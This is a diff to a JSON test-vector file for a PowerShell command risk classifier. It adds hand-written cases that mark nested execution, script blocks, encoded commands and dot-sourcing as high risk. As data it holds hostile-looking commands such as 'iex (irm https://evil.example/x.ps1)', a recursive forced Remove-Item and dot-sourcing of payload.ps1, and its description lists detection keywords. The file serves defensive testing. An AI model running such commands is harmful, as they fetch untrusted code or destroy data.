@@ -1,5 +1,5 @@
 {
-  "description": "Shared Rust/WASM vector for the PowerShell command builder (#298). Every expected value is written by hand from the rules in crates/allw-core/src/powershell.rs (argv is always a whitespace split of raw; risk floor Medium; High when raw contains ; | & a line break, a backtick, $( { iex or Invoke-Expression; raw verbatim); never regenerate it from program output.",
+  "description": "Shared Rust/WASM vector for the PowerShell command builder (#298). Every expected value is written by hand from the rules in crates/allw-core/src/powershell.rs (argv is always a whitespace split of raw; risk floor Medium; High when raw contains ; | & a line break, a backtick, ( {, [scriptblock] or .invoke, a nested-execution command word (iex, Invoke-Expression, Invoke-Command, Start-Process, Start-Job, powershell, pwsh, cmd), an -EncodedCommand parameter or prefix (or -ec), or a leading . (dot-source); raw verbatim); never regenerate it from program output.",
   "cases": [
     {
       "class": "low-risk program raised to the Medium floor",
@@ -83,6 +83,118 @@
       "risk": "high",
       "bin": "iex",
       "argv": ["iex", "(irm", "https://evil.example/x.ps1)"]
+    },
+    {
+      "class": "round 2: a grouping expression runs a nested pipeline",
+      "command": "Write-Output (Remove-Item -Recurse -Force build)",
+      "cwd": null,
+      "risk": "high",
+      "bin": "Write-Output",
+      "argv": ["Write-Output", "(Remove-Item", "-Recurse", "-Force", "build)"]
+    },
+    {
+      "class": "round 2: an array subexpression",
+      "command": "echo @(Remove-Item build)",
+      "cwd": null,
+      "risk": "high",
+      "bin": "echo",
+      "argv": ["echo", "@(Remove-Item", "build)"]
+    },
+    {
+      "class": "round 2: [scriptblock]::Create builds code at run time",
+      "command": "[scriptblock]::Create($s)",
+      "cwd": null,
+      "risk": "high",
+      "bin": "[scriptblock]::Create($s)",
+      "argv": ["[scriptblock]::Create($s)"]
+    },
+    {
+      "class": "round 2: & { } invokes a script block",
+      "command": "& { Remove-Item build }",
+      "cwd": null,
+      "risk": "high",
+      "bin": "&",
+      "argv": ["&", "{", "Remove-Item", "build", "}"]
+    },
+    {
+      "class": "round 2: .Invoke() runs a script block",
+      "command": "$sb.Invoke()",
+      "cwd": null,
+      "risk": "high",
+      "bin": "$sb.Invoke()",
+      "argv": ["$sb.Invoke()"]
+    },
+    {
+      "class": "round 2: Invoke-Command runs a script block",
+      "command": "Invoke-Command -ScriptBlock $sb",
+      "cwd": null,
+      "risk": "high",
+      "bin": "Invoke-Command",
+      "argv": ["Invoke-Command", "-ScriptBlock", "$sb"]
+    },
+    {
+      "class": "round 2: Start-Process starts another program",
+      "command": "Start-Process notepad.exe",
+      "cwd": null,
+      "risk": "high",
+      "bin": "Start-Process",
+      "argv": ["Start-Process", "notepad.exe"]
+    },
+    {
+      "class": "round 2: Start-Job runs a script in the background",
+      "command": "Start-Job -FilePath job.ps1",
+      "cwd": null,
+      "risk": "high",
+      "bin": "Start-Job",
+      "argv": ["Start-Job", "-FilePath", "job.ps1"]
+    },
+    {
+      "class": "round 2: a nested shell",
+      "command": "powershell -Command Remove-Item build",
+      "cwd": null,
+      "risk": "high",
+      "bin": "powershell",
+      "argv": ["powershell", "-Command", "Remove-Item", "build"]
+    },
+    {
+      "class": "round 2: -EncodedCommand hides the command",
+      "command": "pwsh -EncodedCommand SQBFAFgA",
+      "cwd": null,
+      "risk": "high",
+      "bin": "pwsh",
+      "argv": ["pwsh", "-EncodedCommand", "SQBFAFgA"]
+    },
+    {
+      "class": "round 2: -enc (a prefix of -EncodedCommand)",
+      "command": "Write-Output -enc SQBFAFgA",
+      "cwd": null,
+      "risk": "high",
+      "bin": "Write-Output",
+      "argv": ["Write-Output", "-enc", "SQBFAFgA"]
+    },
+    {
+      "class": "round 2: -e (the shortest prefix), any case",
+      "command": "Write-Output -E SQBFAFgA",
+      "cwd": null,
+      "risk": "high",
+      "bin": "Write-Output",
+      "argv": ["Write-Output", "-E", "SQBFAFgA"]
+    },
+    {
+      "class": "round 2: dot-sourcing runs a script in the current scope",
+      "command": ". .\\payload.ps1",
+      "cwd": null,
+      "risk": "high",
+      "bin": ".",
+      "argv": [".", ".\\payload.ps1"]
+    },
+    {
+      "class": "round 2: -Exclude is not a prefix of -EncodedCommand",
+      "command": "Get-ChildItem -Exclude x",
+      "cwd": null,
+      "risk": "medium",
+      "bin": "Get-ChildItem",
+      "argv": ["Get-ChildItem", "-Exclude", "x"]
     }
   ]
 }
